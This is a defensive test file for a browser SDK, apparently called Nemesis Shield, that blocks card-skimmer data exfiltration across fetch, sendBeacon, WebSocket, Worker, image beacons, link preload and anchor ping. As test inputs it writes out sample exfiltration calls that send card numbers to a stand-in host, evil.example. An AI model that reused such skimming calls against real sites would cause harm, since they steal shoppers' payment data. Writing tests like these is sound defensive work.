// Deep coverage test for the Browser SDK - proves it catches exfil / code-load across EVERY channel a
// client-side skimmer uses: fetch, sendBeacon, WebSocket, Worker, Image-beacon (property + setAttribute),
// <link rel=preload>, <img srcset>, <a ping> - blocking off-baseline third-party origins in enforce
// mode while first-party + approved origins pass. Run: node browser/tests/deep.cjs
const NemesisShield = require("../nemesis-shield.js");

let pass = 0, fail = 0;
const ok = (c, m) => (c ? (pass++, console.log("  \x1b[32m✓\x1b[0m " + m)) : (fail++, console.log("  \x1b[31m✗ " + m + "\x1b[0m")));
const sec = (t) => console.log("\n\x1b[1m" + t + "\x1b[0m");
const SELF = "https://shop.example";

// Minimal DOM-less env exposing just the exfil primitives the SDK patches.
function makeEnv() {
  function Img() { this._src = ""; }
  Object.defineProperty(Img.prototype, "src", {
    configurable: true, enumerable: true, get() { return this._src; }, set(v) { this._src = v; },
  });
  return {
    location: { origin: SELF },
    fetch(url) { this.__lastFetch = url; return Promise.resolve({ ok: true, json: () => Promise.resolve(null) }); },
    setInterval() { return 0; },
    navigator: { sendBeacon() { return true; } },
    WebSocket: function (url) { this.url = url; },
    EventSource: function (url) { this.url = url; },
    Worker: function (url) { this.url = url; },
    HTMLImageElement: Img,
  };
}
// A fake element for guardResource (no real DOM needed).
function el(tag, attrs) {
  const a = Object.assign({}, attrs);
  return {
    nodeType: 1, tagName: tag,
    getAttribute: (k) => (k in a ? a[k] : null),
    setAttribute: (k, v) => { a[k] = v; },
    removeAttribute: (k) => { delete a[k]; },
    _attrs: a,
  };
}

const S = NemesisShield.shapeOf;
function enforce(shield, approvedOrigins) {
  const shapes = {};
  for (const [kind, origin] of approvedOrigins) shapes[S(kind, origin).shape] = "allow";
  shield._applyPolicy({ mode: "enforce", policy: { shapes, knownBad: [] } });
}

console.log("\x1b[1mNemesis Shield - Browser deep coverage test\x1b[0m");

// ── 1. decision core ──────────────────────────────────────────────────────────
sec("1 · decision core (first-party allowed, off-baseline third-party blocked)");
{
  const env = makeEnv();
  const s = NemesisShield.createShield({ token: "t", env, selfOrigin: SELF, fetch: env.fetch });
  enforce(s, [["connect", "https://cdn.example"]]);
  ok(!s.shouldBlock("connect", SELF), "first-party origin never blocked");
  ok(!s.shouldBlock("connect", "https://cdn.example"), "approved third-party origin passes");
  ok(s.shouldBlock("connect", "https://evil.example"), "off-baseline third-party origin blocked");
  ok(s.shouldBlock("script", "https://evil.example"), "off-baseline external script origin blocked");
}

// ── 2. network channels (installed patches actually block) ─────────────────────
sec("2 · exfil channels blocked in enforce (fetch / beacon / WebSocket / Worker)");
{
  const env = makeEnv();
  const s = NemesisShield.createShield({ token: "t", env, selfOrigin: SELF, fetch: env.fetch });
  enforce(s, [["connect", "https://cdn.example"]]);
  s.install(); // wraps env.fetch / sendBeacon / Image / WebSocket / Worker …

  let blocked = false;
  env.fetch("https://evil.example/?cc=4111111111111111").catch(() => { blocked = true; });
  // microtask: the rejection is synchronous-ish; check on next tick
  setTimeout(() => {
    ok(blocked, "fetch() to evil origin rejected");
    ok(env.navigator.sendBeacon("https://evil.example", "cc=1") === false, "sendBeacon to evil origin returns false");
    let wsThrew = false; try { new env.WebSocket("wss://evil.example"); } catch (e) { wsThrew = true; }
    ok(wsThrew, "WebSocket to evil origin throws");
    let wkThrew = false; try { new env.Worker("https://evil.example/w.js"); } catch (e) { wkThrew = true; }
    ok(wkThrew, "Worker from evil origin throws");

    // approved / first-party still work
    let okFetch = true;
    env.fetch("https://cdn.example/lib.js").catch(() => { okFetch = false; });
    setTimeout(() => {
      ok(okFetch, "fetch() to approved origin passes");

      // ── 3. image beacon (property setter) ──
      sec("3 · image beacon + DOM resource channels");
      const img = new env.HTMLImageElement();
      img.src = "https://evil.example/?cc=4111"; // guarded property setter
      ok(img.src === "", "Image.src to evil origin neutralized (property setter)");
      const img2 = new env.HTMLImageElement();
      img2.src = "https://cdn.example/logo.png";
      ok(img2.src === "https://cdn.example/logo.png", "Image.src to approved origin allowed");

      // ── setAttribute path + link/preload + a[ping] via guardResource ──
      const beacon = el("IMG", { src: "https://evil.example/?cc=1" });
      s.guardResource(beacon);
      ok(beacon.getAttribute("src") === "about:blank", "<img> beacon via setAttribute neutralized");
      const preload = el("LINK", { rel: "preload", href: "https://evil.example/x.js" });
      s.guardResource(preload);
      ok(preload.getAttribute("href") === "about:blank", "<link rel=preload> off-baseline neutralized");
      const ping = el("A", { ping: "https://evil.example/track" });
      s.guardResource(ping);
      ok(ping.getAttribute("ping") == null, "<a ping> off-baseline removed");
      const legit = el("IMG", { src: "https://cdn.example/ok.png" });
      s.guardResource(legit);
      ok(legit.getAttribute("src") === "https://cdn.example/ok.png", "approved <img> left intact (no false positive)");

      // ── 4. observe + fail-open ──
      sec("4 · observe mode + fail-open never block");
      const env2 = makeEnv();
      const obs = NemesisShield.createShield({ token: "t", env: env2, selfOrigin: SELF, fetch: env2.fetch });
      obs._applyPolicy({ mode: "observe", policy: { shapes: { x: "allow" }, knownBad: [] } });
      ok(!obs.shouldBlock("connect", "https://evil.example"), "observe mode records but never blocks");
      const fo = NemesisShield.createShield({ token: "t", env: makeEnv(), selfOrigin: SELF });
      fo._applyPolicy({ mode: "enforce", policy: { shapes: {}, knownBad: [] } });
      ok(!fo.shouldBlock("connect", "https://evil.example"), "fail-open: no baseline => nothing blocked");

      console.log("\n" + "─".repeat(52));
      if (fail === 0) console.log(`\x1b[32m\x1b[1mALL ${pass} CHECKS PASSED\x1b[0m`);
      else { console.log(`\x1b[31m\x1b[1m${fail} FAILED\x1b[0m, ${pass} passed`); process.exitCode = 1; }
    }, 5);
  }, 5);
}
